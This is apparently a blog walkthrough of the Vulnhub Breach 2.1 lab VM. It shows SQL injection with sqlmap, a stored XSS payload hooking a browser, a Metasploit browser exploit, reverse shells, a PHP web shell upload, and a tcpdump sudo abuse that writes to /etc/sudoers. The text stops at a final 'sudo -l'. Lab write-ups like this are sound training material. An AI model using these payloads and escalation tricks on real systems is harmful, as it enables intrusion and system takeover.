---
layout: post
title:  "Vulnhub - Breach 2.1"
date:   2016-09-06 16:07:19
categories: [walkthrough]
comments: false
---
An Office Space themed VM [Breach 2.1](https://www.vulnhub.com/entry/breach-21,159/) written by [mrb3n](https://www.vulnhub.com/author/mrb3n,293/), was a continuation on Breach 1.0, which I enjoyed so I downloaded it to continue on.
<!--more-->
Big thanks to mrb3n for creating this system and [Vulnhub](https://www.vulnhub.com/) for providing it!  

## Description

Second in a multi-part series, Breach 2.0 is a boot2root/CTF challenge which attempts to showcase a real-world scenario, with plenty of twists and trolls along the way.

The VM is configured with a static IP (192.168.110.151) so you'll need to configure your host only adaptor to this subnet. Sorry! Last one with a static IP ;)

A hint: Imagine this as a production environment during a busy work day.

Shout-out to knightmare for many rounds of testing and assistance with the final configuration as well as rastamouse, twosevenzero and g0blin for testing and providing valuable feedback. As always, thanks to g0tmi1k for hosting and maintaining #vulnhub.

VirtualBox users: if the screen goes black on boot once past the grub screen make sure to go to settings ---> general, and make sure it says Type: Linux Version: Debian 64bit

If you run into any issues, you can find me on Twitter: https://twitter.com/mrb3n813 or on IRC in #vulnhub.

Looking forward to the write-ups, especially any unintended paths to local/root.

Happy hunting!

## Enumeration

As the VM is set to a static IP, we get to skip the host enumration phase and go straight into service enumeration.  Going to start off with NMAP even though that was pointless in Breach 1.0.

{% highlight bash %}
root@kali:~/evidence/breach 2.1# nmap -p 0-65535 192.168.110.151 -sV

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-22 15:40 MDT
Nmap scan report for 192.168.110.151
Host is up (0.00017s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
111/tcp   open  rpcbind 2-4 (RPC #100000)
48166/tcp open  status  1 (RPC #100024)
65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)
MAC Address: 00:0C:29:5C:D5:2A (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds
root@kali:~/evidence/breach 2.1# -
{% endhighlight %}

Right off the bat this one worked and provided 3 odd ports.  Lets start with SSH, see if that gets us somewhere.

{% highlight bash %}
root@kali:~/evidence/breach 2.1# ssh 192.168.110.151 -p 65535
The authenticity of host '[192.168.110.151]:65535 ([192.168.110.151]:65535)' can't be established.
ECDSA key fingerprint is SHA256:r3uJxHJmvGvDbfvH0Y90EO5UAQNeokBIsxs6eDNpEdU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[192.168.110.151]:65535' (ECDSA) to the list of known hosts.
#############################################################################
#                  Welcome to Initech Cyber Consulting, LLC                 #
#	          All connections are monitored and recorded                #
#	              Unauthorized access is encouraged                     #
#	      Peter, if that's you - the password is in the source.         #
#          Also, stop checking your blog all day and enjoy your vacation!   #
#############################################################################
root@192.168.110.151's password:
Permission denied, please try again.
root@192.168.110.151's password:
Permission denied, please try again.
root@192.168.110.151's password:
Permission denied (publickey,password).
root@kali:~/evidence/breach 2.1# -
{% endhighlight %}

Looks like we found a valid SSH service.  Interesting comment though.  Lets try to connect as `peter`.

{% highlight bash %}
root@kali:~/evidence/breach 2.1# ssh peter@192.168.110.151 -p 65535
#############################################################################
#                  Welcome to Initech Cyber Consulting, LLC                 #
#	          All connections are monitored and recorded                #
#	              Unauthorized access is encouraged                     #
#	      Peter, if that's you - the password is in the source.         #
#          Also, stop checking your blog all day and enjoy your vacation!   #
#############################################################################
peter@192.168.110.151's password:
Permission denied, please try again.
peter@192.168.110.151's password:
Permission denied, please try again.
peter@192.168.110.151's password:
Connection to 192.168.110.151 closed.
root@kali:~/evidence/breach 2.1#
{% endhighlight %}

I tried a bunch of passwords here, simple things like peter, gibbons, initech, and then I noticed the hint in the source.  At that point I attempted `in the source` but that failed, and finally tried `inthesource` which worked!

But immediately connection closed.  Odd.  But something did happen so lets scan once again.

{% highlight bash %}
root@kali:~/evidence/breach 2.1# nmap -p 0-65535 192.168.110.151 -sV

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-22 15:48 MDT
Nmap scan report for 192.168.110.151
Host is up (0.00022s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
48166/tcp open  status  1 (RPC #100024)
65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)
MAC Address: 00:0C:29:5C:D5:2A (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds
root@kali:~/evidence/breach 2.1#  -
{% endhighlight %}

Excellent, web is now open.  Lets take a look.

![index page](/img/breach2/index.php.png)

{% highlight html %}
<!DOCTYPE html>
<html>
<head>
<title>Initech Cyber Consulting, LLC</title>
</head>
<body>

<center><h1>Welcome to Initech Cyber Consulting, LLC<h1></center>

<center><IMG SRC="/images/beef.jpg" WIDTH=500 HEIGHT=500></center>
<p><b>They really shouldn't have taken my stapler away...</b></p>

<!--I like hints! Here at Initech we don't trust our users and either should you!-->
<!--I'm not just going to stick creds here, really, I'm not. Sorry-->
</body>
</html>
{% endhighlight %}

Hah nice troll in the source.  Attempted to look into /images but got a 403, and nothing of interest in the image.  The ssh login banner mentioned a blog lets see if that exists in /blog/.  If not its off to dirbuster.

![blog index page](/img/breach2/blog-index.png)

Excellent, found his blog.  Comment referenced him logging in often, perhaps that will be useful.  But lets do some quick tests to see if anything on the main site is exploitable.

{% highlight bash %}
root@kali:~/evidence/breach 2.1# sqlmap -u http://192.168.110.151/blog/index.php?search=
         _
 ___ ___| |_____ ___ ___  {1.0.8.2#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:00:30

[16:00:30] [WARNING] provided value for parameter 'search' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[16:00:30] [INFO] testing connection to the target URL
[16:00:30] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[16:00:30] [INFO] testing if the target URL is stable
[16:00:31] [INFO] target URL is stable
[16:00:31] [INFO] testing if GET parameter 'search' is dynamic
[16:00:31] [INFO] confirming that GET parameter 'search' is dynamic
[16:00:31] [INFO] GET parameter 'search' is dynamic
[16:00:31] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[16:00:31] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting attacks
[16:00:31] [INFO] testing for SQL injection on GET parameter 'search'
[16:00:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:00:32] [WARNING] reflective value(s) found and filtering out
[16:00:32] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[16:00:32] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:00:32] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[16:00:32] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
[16:00:32] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[16:00:32] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[16:00:32] [INFO] testing 'MySQL inline queries'
[16:00:32] [INFO] testing 'PostgreSQL inline queries'
[16:00:32] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[16:00:32] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[16:00:32] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[16:00:33] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[16:00:33] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[16:00:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[16:01:13] [INFO] GET parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[16:01:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:01:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:01:26] [INFO] target URL appears to be UNION injectable with 9 columns
[16:01:26] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 99 HTTP(s) requests:
---
Parameter: search (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: search=%' AND SLEEP(5) AND '%'='

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: search=%' UNION ALL SELECT CONCAT(0x717a626271,0x49754a594e6e62744f635456445651435147664f4b51734967784154555555634e754c59686e4f47,0x716b6b6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- kBSI
---
[16:01:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8.0 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[16:01:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.110.151'

[*] shutting down at 16:01:34

root@kali:~/evidence/breach 2.1#
{% endhighlight %}

Sweet, looks like we did find an SQLi in the search function and managed to get a couple of pieces of version information.  Lets proceed to pillage the village.

First: `-dbs`
{% highlight bash %}
[16:03:41] [INFO] fetching database names
[16:03:41] [WARNING] reflective value(s) found and filtering out
available databases [5]:
[*] blog
[*] information_schema
[*] mysql
[*] oscommerce
[*] performance_schema

[16:03:41] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.110.151'

[*] shutting down at 16:03:41
{% endhighlight %}

Next: `-D blog --tables `
{% highlight bash %}
[16:05:19] [INFO] fetching tables for database: 'blog'
[16:05:19] [WARNING] reflective value(s) found and filtering out
Database: blog
[10 tables]
+-----------------------+
| blogphp_blogs         |
| blogphp_cat           |
| blogphp_comments      |
| blogphp_files         |
| blogphp_links         |
| blogphp_pages         |
| blogphp_stats         |
| blogphp_subscriptions |
| blogphp_templates     |
| blogphp_users         |
+-----------------------+

[16:05:19] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.110.151'

[*] shutting down at 16:05:19
{% endhighlight %}

Finally `-D blog -T blogphp_users --dump`.  And...

{% highlight bash %}
[16:18:04] [WARNING] table 'blogphp_users' in database 'blog' appears to be empty
Database: blog
Table: blogphp_users
[0 entries]
+----+-----+-----+-----+-----+------+------+-------+-------+-------+-------+--------+--------+--------+---------+----------+----------+
| id | msn | aim | url | icq | name | bday | yahoo | email | mlist | gtalk | logged | date   | avatar | level   | username | password |
+----+-----+-----+-----+-----+------+------+-------+-------+-------+-------+--------+--------+--------+---------+----------+----------+
+----+-----+-----+-----+-----+------+------+-------+-------+-------+-------+--------+--------+--------+---------+----------+----------+

[16:18:04] [INFO] table 'blog.blogphp_users' dumped to CSV file '/root/.sqlmap/output/192.168.110.151/dump/blog/blogphp_users.csv'
[16:18:04] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.110.151'

[*] shutting down at 16:18:04
{% endhighlight %}

Garbage.  However doing the same on a different db `-D oscommerce -T osc_administrators --dump` does yeild some fruit.

{% highlight bash %}
[16:20:54] [INFO] analyzing table dump for possible password hashes
Database: oscommerce
Table: osc_administrators
[1 entry]
+----+-----------+-------------------------------------+
| id | user_name | user_password                       |
+----+-----------+-------------------------------------+
| 1  | admin     | 685cef95aa31989f2edae5e055ffd2c9:32 |
+----+-----------+-------------------------------------+

[16:20:54] [INFO] table 'oscommerce.osc_administrators' dumped to CSV file '/root/.sqlmap/output/192.168.110.151/dump/oscommerce/osc_administrators.csv'
[16:20:54] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.110.151'

[*] shutting down at 16:20:54
{% endhighlight %}

Running that through an online cracker we recieve `32admin` as the password.

![32admin](/img/breach2/32admin.png)

Have not found where to use `admin:32admin` but we'll keep that around.

Going back to the blog I register a new user and start exploring what is possible.  Interesting enough there is a location for an avatar but it doesn't seem to care what kind of URL is placed in there.  Considering I'd like to do a beef exploit or client side attack of some kind lets pre-populate that and listen with netcat.  `http://192.168.110.139:8000/beefhook.js`

After a bit:

{% highlight bash %}
root@kali:~/evidence/breach 2.1# nc -lvp 8000
listening on [any] 8000 ...
192.168.110.151: inverse host lookup failed: Unknown host
connect to [192.168.110.139] from (UNKNOWN) [192.168.110.151] 38808
GET /beefhook.js HTTP/1.0
Host: 192.168.110.139:8000
Connection: close

^C
root@kali:~/evidence/breach 2.1#  -
{% endhighlight %}

Excellent, client side attacks very cool.  But try as I might I can't get the exploit to do much more than what would amount to stealing cookies.  Looking on exploit-db for blogphp xss I find [this](https://www.exploit-db.com/exploits/17640/).  I then set a new user to `<META http-equiv="refresh" content="0;URL=http://192.168.110.139:3000/demos/basic.html">`.

![beefhooked](/img/breach2/beefhook.png)

Got a hook! ok now to redirect them to metasploit.  Because I prefer shells.

{% highlight bash %}
msf > use exploit/multi/browser/firefox_proto_crmfrequest
msf exploit(firefox_proto_crmfrequest) > show options

Module options (exploit/multi/browser/firefox_proto_crmfrequest):

   Name           Current Setting               Required  Description
   ----           ---------------               --------  -----------
   ADDONNAME      HTML5 Rendering Enhancements  yes       The addon name.
   AutoUninstall  true                          yes       Automatically uninstall the addon after payload execution
   CONTENT                                      no        Content to display inside the HTML <body>.
   Retries        true                          no        Allow the browser to retry the module
   SRVHOST        0.0.0.0                       yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT        8080                          yes       The local port to listen on.
   SSL            false                         no        Negotiate SSL for incoming connections
   SSLCert                                      no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                                      no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Universal (Javascript XPCOM Shell)


msf exploit(firefox_proto_crmfrequest) > set SRVHOST 192.168.110.139
SRVHOST => 192.168.110.139
msf exploit(firefox_proto_crmfrequest) > show payloads

Compatible Payloads
===================

   Name                       Disclosure Date  Rank    Description
   ----                       ---------------  ----    -----------
   firefox/exec                                normal  Firefox XPCOM Execute Command
   firefox/shell_bind_tcp                      normal  Command Shell, Bind TCP (via Firefox XPCOM script)
   firefox/shell_reverse_tcp                   normal  Command Shell, Reverse TCP (via Firefox XPCOM script)
   generic/custom                              normal  Custom Payload
   generic/shell_bind_tcp                      normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                   normal  Generic Command Shell, Reverse TCP Inline

msf exploit(firefox_proto_crmfrequest) > set LHOST 192.168.110.139
LHOST => 192.168.110.139
msf exploit(firefox_proto_crmfrequest) > run
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.110.139:4444
[*] Using URL: http://192.168.110.139:8080/dR1Ueh0yC2a
[*] Server started.
msf exploit(firefox_proto_crmfrequest) >
[*] Gathering target information for 192.168.110.151
[*] Sending HTML response to 192.168.110.151
[*] Sending HTML
[*] Sending the malicious addon
[*] Command shell session 2 opened (192.168.110.139:4444 -> 192.168.110.151:42650) at 2016-09-23 10:25:05 -0600
msf exploit(firefox_proto_crmfrequest) > sessions -i

Active sessions
===============

Id  Type           Information  Connection
--  ----           -----------  ----------
2   shell firefox               192.168.110.139:4444 -> 192.168.110.151:42650 (192.168.110.151)

msf exploit(firefox_proto_crmfrequest) > use post/multi/manage/shell_to_meterpreter
msf post(shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

 Name     Current Setting  Required  Description
 ----     ---------------  --------  -----------
 HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
 LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
 LPORT    4433             yes       Port for payload to connect to.
 SESSION  1                yes       The session to run this module on.

msf post(shell_to_meterpreter) > sessions -i

Active sessions
===============

 Id  Type           Information  Connection
 --  ----           -----------  ----------
 2   shell firefox               192.168.110.139:4444 -> 192.168.110.151:42719 (192.168.110.151)

msf post(shell_to_meterpreter) > set session 2
session => 2
msf post(shell_to_meterpreter) > run
\
[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.110.139:4433
[*] Starting the payload handler...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 192.168.110.151
[*] Command stager progress: 100.00% (668/668 bytes)
[*] Post module execution completed
msf post(shell_to_meterpreter) > \[*] Meterpreter session 3 opened (192.168.110.139:4433 -> 192.168.110.151:53475) at 2016-09-23 11:09:49 -0600

msf post(shell_to_meterpreter) > sessions -i

Active sessions
===============

 Id  Type                   Information                                                               Connection
 --  ----                   -----------                                                               ----------
 2   shell firefox                                                                                    192.168.110.139:4444 -> 192.168.110.151:42719 (192.168.110.151)
 3   meterpreter x86/linux  uid=1000, gid=1000, euid=1000, egid=1000, suid=1000, sgid=1000 @ breach2  192.168.110.139:4433 -> 192.168.110.151:53475 (192.168.110.151)

msf post(shell_to_meterpreter) >
{% endhighlight %}

Excellent, from beef to meterpreter.  Sadly we do not have root just yet so we have a bit more work to do.   Let's start with some enumeration.

{% highlight bash %}
meterpreter > sysinfo
Computer     : breach2
OS           : Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) (x86_64)
Architecture : x86_64
Meterpreter  : x86/linux
meterpreter > shell
Process 3098 created.
Channel 1 created.
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ wget http://192.168.110.139:8000/enum/LinEnum.sh
wget http://192.168.110.139:8000/enum/LinEnum.sh
converted 'http://192.168.110.139:8000/enum/LinEnum.sh' (ANSI_X3.4-1968) -> 'http://192.168.110.139:8000/enum/LinEnum.sh' (UTF-8)
--2016-09-23 14:35:23--  http://192.168.110.139:8000/enum/LinEnum.sh
Connecting to 192.168.110.139:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 40154 (39K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh          100%[=====================>]  39.21K  --.-KB/s   in 0s     

2016-09-23 14:35:23 (588 MB/s) - 'LinEnum.sh' saved [40154/40154]

$ sh LinEnum.sh
sh LinEnum.sh
-e
\e[00;31m#########################################################\e[00m
-e \e[00;31m#\e[00m \e[00;33mLocal Linux Enumeration & Privilege Escalation Script\e[00m \e[00;31m#\e[00m
-e \e[00;31m#########################################################\e[00m
-e \e[00;33m# www.rebootuser.com\e[00m
-e \e[00;33m# \e[00m

Debug Info
thorough tests = disabled
-e

-e \e[00;33mScan started at:
Fri Sep 23 14:35:31 EDT 2016
-e \e[00m

-e \e[00;33m### SYSTEM ##############################################\e[00m
-e \e[00;31mKernel information:\e[00m
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64 GNU/Linux
-e

-e \e[00;31mKernel information (continued):\e[00m
Linux version 3.16.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 4.8.4 (Debian 4.8.4-1) ) #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08)
-e

-e \e[00;31mSpecific release information:\e[00m
PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
NAME="Debian GNU/Linux"
VERSION_ID="8"
VERSION="8 (jessie)"
ID=debian
HOME_URL="http://www.debian.org/"
SUPPORT_URL="http://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
-e

-e \e[00;31mHostname:\e[00m
breach2
-e

-e \e[00;33m### USER/GROUP ##########################################\e[00m
-e \e[00;31mCurrent user/group info:\e[00m
uid=1000(peter) gid=1000(peter) groups=1000(peter),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(scanner),115(bluetooth),1003(fishermen)
-e

-e \e[00;31mUsers that have previously logged onto the system:\e[00m
Username         Port     From             Latest
root             tty1                      Mon Jul 18 21:27:06 -0400 2016
peter            pts/0    192.168.110.139  Fri Sep 23 12:23:16 -0400 2016
blumbergh        tty1                      Mon Jul 18 21:26:51 -0400 2016
milton           pts/0    localhost        Wed Jul 20 21:04:18 -0400 2016
-e

... snip ...

-e \e[00;33mWe can sudo without supplying a password!\e[00m
Matching Defaults entries for peter on breach2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on breach2:
    (root) NOPASSWD: /etc/init.d/apache2
-e

-e \e[00;31mAre permissions on /home directories lax:\e[00m
total 20K
drwxr-xr-x  5 root      root      4.0K Jun 19 16:42 .
drwxr-xr-x 22 root      root      4.0K Jun 20 14:21 ..
drwxr-xr-x  2 blumbergh blumbergh 4.0K Jun 19 16:42 bill
drwxr-xr-x 16 milton    milton    4.0K Jul 20 21:04 milton
drwxr-xr-x 19 peter     peter     4.0K Jul 20 21:04 peter
-e

... snip ...

-e \e[00;31mListening TCP:\e[00m
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:51407           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.110.151:46316   192.168.110.139:3000    TIME_WAIT   -               
tcp        0      0 192.168.110.151:53475   192.168.110.139:4433    ESTABLISHED 1878/oBFXi      
tcp6       0      0 :::111                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::57749                :::*                    LISTEN      -               
-e

... snip ...

$ -
{% endhighlight %}

Ok some things of interest, `Milton` recently logged in, 2323 is open locally, and peter can run apache2 as root without a password.  The extra port is of biggest interest to me so lets try connecting to it.

{% highlight bash %}
$ telnet localhost 2323
telnet localhost 2323
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
29 45'46" N 95 22'59" W
breach2 login:
{% endhighlight %}

Connection prompts us for a password, but the banner is interesting.  Lets go to google to see where `29 45'46" N 95 22'59" W` is.

![houston](/img/breach2/houston.png)

Looks like Houston Police Officer Memorial.  Kind of odd.  At this point I'm pretty sure I need to login as Milton but the only known password I have is `32admin`, and potentially the clue from the geo location.  I attempt to login with a couple passwords all fail until I try...

{% highlight bash %}
$ telnet localhost 2323
telnet localhost 2323
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
29 45'46" N 95 22'59" W
breach2 login: milton
milton
Password: Houston

Last login: Wed Jul 20 21:04:18 EDT 2016 from localhost on pts/0
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64
29 45'46" N 95 22'59" W
3
2
1
Whose stapler is it?mine
mine
Woot!
milton@breach2:~$
{% endhighlight %}

As I am supposed to be milton when asked 'Whose stapler is it?' the proper response would be `mine`.  Heh amusing.  But now I'm logged in as `Milton`!

After doing a bit of enumeration and digging on milton's profile I stumble acorss something quite interesting.

{% highlight bash %}
milton@breach2:~$ cat .profile
cat .profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

python /usr/local/bin/cd.py
sudo /etc/init.d/nginx start &> /dev/null

sudo() {
	echo "Sorry, user milton may not run sudo on breach2."
}
readonly -f sudo
milton@breach2:~$ -
{% endhighlight %}

Looks like when I logged into Milton's account there should be a new service for nginx!  Also interesting that there is a sudo function.  Executing the real sudo I see the following:

{% highlight bash %}
milton@breach2:~$ /usr/bin/sudo -l
Matching Defaults entries for milton on breach2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User milton may run the following commands on breach2:
    (root) NOPASSWD: /etc/init.d/nginx
milton@breach2:~$ -
{% endhighlight %}

I sense a privilege escalation in the near future!  Lets see what port this new nginx server is listening on.

{% highlight bash %}
milton@breach2:~$ netstat -nao | grep tcp | grep LISTEN
netstat -nao | grep tcp | grep LISTEN
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:51407           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::8888                 :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::111                  :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::57749                :::*                    LISTEN      off (0.00/0/0)
milton@breach2:~$ -
{% endhighlight %}

Looks like tcp/8888 is new.  Lets connect and see what it is.

![tcp/8888 index page](/img/breach2/8888index.png)

Excellent, oscommerce.  As its the same db name as the SQL server we previously compromised, chances are the credentials `admin:32admin` will work.

However, attempting to use them in the `/admin/` folder fails!  After doing a bit of research the 32 is just a "salt" mechanism (which I should have picked up on since the hash in the database was hash:32) so the account is really at the defaults of `admin/admin`.  Lets give that a go.

![tcp8888admin](/img/breach2/tcp8888admin.png)

Excellent Smithers!  We're in.  Now all we need to do is find something to exploit, command injection, RFI, file upload, etc.

![tcp8888fileman](/img/breach2/tcp8888fileman.png)

After looking through the application a bit `Tools -> File Manager` sounds very appealing.  But all the directories in the root are not writable!  But a proper search would mean to check every link, so lets see if there is anything writable.  But as there are a ton of directories and I don't feel like spending all that time just yet I go back to my trusty shell.

{% highlight bash %}
milton@breach2:~$ cd /var/www/html2/oscommerce
milton@breach2:/var/www/html2/oscommerce$ find -type d -writable
find -type d -writable
./includes/work
milton@breach2:/var/www/html2/oscommerce$ -
{% endhighlight %}

Bwahaha, now to verify its writable to the web interface.

![writable directory](/img/breach2/tcp8888writable.png)

Looks writable to me.  Time to modify a php-reverse-shell, upload it and get root access.

{% highlight bash %}
root@kali:~/evidence/breach2.1# cp /usr/share/webshells/php/php-reverse-shell.php .
root@kali:~/evidence/breach2.1# nano php-reverse-shell.php
root@kali:~/evidence/breach2.1# nc -lvp 2222
listening on [any] 2222 ...
{% endhighlight %}

![reversshell](/img/breach2/tcp8888reverseshell.png)

Reverse shell uploaded!  Now to execute it, browsing to `/oscommerce/includes/work/php-reverse-shell.php` is all thats needed.

{% highlight bash %}
root@kali:~/evidence/breach2.1# nc -lvp 2222
listening on [any] 2222 ...
192.168.110.151: inverse host lookup failed: Unknown host
connect to [192.168.110.139] from (UNKNOWN) [192.168.110.151] 54130
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64 GNU/Linux
 15:15:19 up  2:55,  1 user,  load average: 0.06, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
milton   pts/2    localhost        14:47    9:06   0.03s  0.03s -bash
uid=1001(blumbergh) gid=1001(blumbergh) groups=1001(blumbergh),1004(fin)
/bin/sh: 0: can't access tty; job control turned off
$ -
{% endhighlight %}

Nope.. not root... but blumbergh.  So thats something.  Lets see if this account has any special privs.

{% highlight bash %}
$ sudo -l
Matching Defaults entries for blumbergh on breach2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User blumbergh may run the following commands on breach2:
    (root) NOPASSWD: /usr/sbin/tcpdump
$ -
{% endhighlight %}

Ok.. interesting can run tcpdump as root without a password.  Well to be honest this stumped me for a bit.  I was thinking I needed to capture something that would have a password to use but that didn't prove to be valid.  Eventually I stumbled across this amazing post https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/ and managed to add a really cool shell escape to my arsenal.

It seems tcpdump has the ability to run scripts to perform actions on dumps at split time.  Normally this is for compressing the captures or similar.  Well if exploited properly the script will run as root.  And what possible thing would we want root to run for us?  Perhaps let us do anything as root without a password?

{% highlight bash %}
$ echo $'id\necho "blumbergh	ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /tmp/root
$ chmod +x /tmp/root
$ cat /tmp/root
$id
echo "blumbergh	ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/root -Z root         
dropped privs to root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
$ sudo -l
